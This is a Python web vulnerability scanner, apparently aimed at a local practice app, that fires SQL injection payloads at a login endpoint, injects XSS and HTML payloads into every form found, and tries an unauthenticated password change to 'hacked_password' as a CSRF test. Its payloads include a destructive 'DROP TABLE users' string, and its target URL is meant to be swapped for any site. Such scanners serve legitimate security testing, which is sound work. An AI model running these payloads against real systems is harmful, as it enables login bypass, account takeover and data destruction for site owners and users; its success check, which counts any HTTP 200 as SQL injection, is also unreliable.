import requests
from bs4 import BeautifulSoup

# Set the target URL
BASE_URL = "http://localhost:3000"  # Change this to your target

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

def test_sql_injection():
    """Test for SQL Injection vulnerabilities in login."""
    url = f"{BASE_URL}/rest/user/login"
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "'; DROP TABLE users --",
        "' UNION SELECT null, version(), null --"
    ]
    
    for payload in payloads:
        data = {"email": payload, "password": "anything"}
        response = requests.post(url, json=data, headers=HEADERS)

        print(f"[*] Testing SQLi payload: {payload}")
        print(f"[DEBUG] Response: {response.text[:500]}")  # Show first 500 chars of response

        if "authentication succeeded" in response.text.lower() or response.status_code == 200:
            print(f"[+] SQL Injection vulnerability detected using: {payload}\n")
            return

    print("[-] No SQL Injection detected.\n")

def test_csrf():
    """Test for CSRF by attempting to change user password."""
    cookies = {"session": "test-session-cookie"}  # Update with actual session
    url = f"{BASE_URL}/rest/user/change-password"
    
    data = {
        "new": "hacked_password",
        "repeat": "hacked_password"
    }

    response = requests.post(url, json=data, cookies=cookies, headers=HEADERS)

    print(f"[*] Testing CSRF at {url}")
    print(f"[DEBUG] Response: {response.text[:500]}")  # Log trimmed response

    if response.status_code == 200 and "success" in response.text.lower():
        print("[+] Possible CSRF vulnerability detected! Password changed without a CSRF token.\n")
    else:
        print("[-] CSRF protection seems to be in place.\n")

def test_xss():
    """Test for XSS vulnerabilities by injecting JavaScript into forms."""
    response = requests.get(BASE_URL, headers=HEADERS)
    soup = BeautifulSoup(response.text, "html.parser")

    forms = soup.find_all("form")
    print(f"[+] Found {len(forms)} forms for XSS testing.\n")

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>"
    ]

    for form in forms:
        action = form.get("action", "")
        full_url = BASE_URL + action
        inputs = form.find_all("input")

        data = {}
        for input_field in inputs:
            name = input_field.get("name")
            if name:
                data[name] = xss_payloads[0]  # Inject payload

        response = requests.post(full_url, data=data, headers=HEADERS)

        print(f"[*] Testing XSS on {full_url}")
        print(f"[DEBUG] Response: {response.text[:500]}")  # Log output

        if xss_payloads[0] in response.text:
            print(f"[+] XSS vulnerability detected on {full_url}!\n")
        else:
            print(f"[-] No XSS detected on {full_url}.\n")

def test_html_injection():
    """Test for HTML Injection vulnerabilities by injecting HTML elements into forms."""
    response = requests.get(BASE_URL, headers=HEADERS)
    soup = BeautifulSoup(response.text, "html.parser")

    forms = soup.find_all("form")
    print(f"[+] Found {len(forms)} forms for HTML Injection testing.\n")

    html_payloads = [
        "<h1>Hacked!</h1>",
        "<marquee>Hacked!</marquee>",
        "<div style='color:red;font-size:30px;'>HTML Injection Test</div>"
    ]

    for form in forms:
        action = form.get("action", "")
        full_url = BASE_URL + action
        inputs = form.find_all("input")

        data = {}
        for input_field in inputs:
            name = input_field.get("name")
            if name:
                data[name] = html_payloads[0]  # Inject payload

        response = requests.post(full_url, data=data, headers=HEADERS)

        print(f"[*] Testing HTML Injection on {full_url}")
        print(f"[DEBUG] Response: {response.text[:500]}")  # Log output

        if html_payloads[0] in response.text:
            print(f"[+] HTML Injection vulnerability detected on {full_url}!\n")
        else:
            print(f"[-] No HTML Injection detected on {full_url}.\n")

def main():
    print("===== Starting Advanced Security Scanner =====\n")
    
    print("[*] Testing for SQL Injection...")
    test_sql_injection()
    
    print("[*] Testing for CSRF Vulnerabilities...")
    test_csrf()
    
    print("[*] Testing for XSS Vulnerabilities...")
    test_xss()

    print("[*] Testing for HTML Injection Vulnerabilities...")
    test_html_injection()

    print("\n===== Security Scan Completed =====")

if __name__ == "__main__":
    main()
